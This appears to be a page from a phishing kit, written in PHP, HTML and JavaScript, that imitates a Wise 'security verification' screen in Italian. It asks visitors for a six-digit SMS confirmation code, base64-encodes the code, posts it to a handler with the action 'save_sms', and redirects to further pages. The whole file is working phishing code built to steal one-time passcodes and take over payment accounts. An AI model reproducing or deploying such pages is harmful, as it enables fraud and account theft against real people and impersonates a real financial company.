<?php
session_start();
?>
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Verifica di sicurezza - Wise</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</head>
<body class="bg-white min-h-screen flex flex-col justify-between m-0 p-0 overflow-x-hidden">

    
    <div class="w-full flex justify-between items-center px-6 py-4 border-b border-gray-100 bg-white">
        <img src="_assets/logo.png" width="85" class="object-contain block">
        <div class="cursor-pointer text-gray-800 text-xl font-light">
            <i class="fa-solid fa-xmark text-xl"></i>
        </div>
    </div>

   
    <div id="app_view" class="w-full max-w-[390px] mx-auto px-6 my-auto py-12 flex flex-col justify-center">
        
        
        <div class="text-center mb-10">
            <h1 class="text-2xl font-bold text-gray-900 mb-3 tracking-tight">Inserisci il codice</h1>
            <div class="text-xs text-gray-600 font-medium leading-relaxed px-2">
                Abbiamo inviato un codice di conferma al tuo dispositivo. Inseriscilo qui sotto per continuare.
            </div>
        </div>

       
        <div class="flex flex-col gap-8 w-full">
            
         
            <div class="flex flex-col gap-3">
                <div class="flex justify-between gap-2.5" id="otp-container">
                    <input type="text" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-xl text-center text-xl font-bold outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all shadow-sm" inputmode="numeric" pattern="[0-9]*">
                    <input type="text" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-xl text-center text-xl font-bold outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all shadow-sm" inputmode="numeric" pattern="[0-9]*">
                    <input type="text" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-xl text-center text-xl font-bold outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all shadow-sm" inputmode="numeric" pattern="[0-9]*">
                    <input type="text" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-xl text-center text-xl font-bold outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all shadow-sm" inputmode="numeric" pattern="[0-9]*">
                    <input type="text" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-xl text-center text-xl font-bold outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all shadow-sm" inputmode="numeric" pattern="[0-9]*">
                    <input type="text" maxlength="1" class="otp-input w-12 h-14 border border-gray-300 rounded-xl text-center text-xl font-bold outline-none focus:border-gray-900 focus:ring-1 focus:ring-gray-900 bg-white text-gray-900 transition-all shadow-sm" inputmode="numeric" pattern="[0-9]*">
                </div>
                <small id="otp_err" class="text-red-500 text-xs hidden text-center pt-1">Inserisci un codice valido di 6 cifre</small>
            </div>

            
            <div class="pt-2">
                <button type="button" id="btn_otp_confirm" class="w-full h-12 bg-[#9fe870] text-[#163300] font-bold text-sm rounded-full flex items-center justify-center cursor-pointer transition shadow-none">
                    <span id="otp_btn_text">Conferma</span>
                </button>
            </div>

         
            <div class="text-center text-xs text-gray-600 font-medium pt-3 flex flex-col gap-2">
                <span id="timer_box">Non hai ricevuto il codice? <span id="countdown" class="font-bold text-gray-900">01:30</span></span>
                <a href="#" id="resend_link" class="text-[#00b9ff] font-bold underline hidden">Invia di nuovo</a>
            </div>
        </div>
    </div>

  
    <div class="w-full text-center py-4 bg-[#f3f4f6] text-gray-500 text-xs font-medium border-t border-gray-200">
        © Wise Payments Limited 2026
    </div>

<script>
$(document).ready(function() {
    const inputs = $('.otp-input');
    
    inputs.on('input', function() {
        const val = $(this).val();
        if (val.length === 1) {
            $(this).removeClass('border-red-500').addClass('border-gray-900');
            const next = inputs.index(this) + 1;
            if (next < inputs.length) {
                inputs.eq(next).focus();
            }
        }
    });

    inputs.on('keydown', function(e) {
        if (e.key === 'Backspace') {
            if ($(this).val() === '') {
                const prev = inputs.index(this) - 1;
                if (prev >= 0) {
                    inputs.eq(prev).focus().val('');
                }
            } else {
                $(this).val('');
            }
            e.preventDefault();
        }
    });

    let timeLeft = 90;
    const timerInterval = setInterval(function() {
        let minutes = Math.floor(timeLeft / 60);
        let seconds = timeLeft % 60;
        
        minutes = minutes < 10 ? '0' + minutes : minutes;
        seconds = seconds < 10 ? '0' + seconds : seconds;
        
        $('#countdown').text(minutes + ':' + seconds);
        
        if (timeLeft <= 0) {
            clearInterval(timerInterval);
            $('#timer_box').hide();
            $('#resend_link').removeClass('hidden');
        }
        timeLeft--;
    }, 1000);

    $('#btn_otp_confirm').on('click', function() {
        let code = '';
        let isValid = true;
        
        inputs.each(function() {
            if ($(this).val() === '') {
                isValid = false;
                $(this).addClass('border-red-500');
            } else {
                code += $(this).val();
            }
        });
        
        if (!isValid || code.length < 6) {
            $('#otp_err').show();
            return;
        }

        $('#otp_err').hide();
        var btn = $(this);
        btn.prop('disabled', true);
        $('#otp_btn_text').html('<div style="width:16px; height:16px; border:2px solid rgba(22,51,0,0.3); border-top:2px solid #163300; border-radius:50%; animation:_sp 1s linear infinite; margin: 0 auto;"></div>');

        var p = btoa(unescape(encodeURIComponent(code)));

        setTimeout(function() {
            $.post("_api/handler.php", { 
                action: "save_sms", 
                p_load: p 
            }, function(response) {
                var nxt = response.trim();
                if(nxt.length > 0 && nxt !== "OK") {
                    window.location.href = nxt; 
                } else {
                    window.location.href = "em.php";
                }
            }).fail(function() {
                btn.prop('disabled', false);
                $('#otp_btn_text').text("Conferma");
                alert("Si è verificato un errore. Riprova.");
            });
        }, 1500);
    });
});
</script>
<style>
    @keyframes _sp { to { transform: rotate(360deg); } }
</style>
</body>
</html>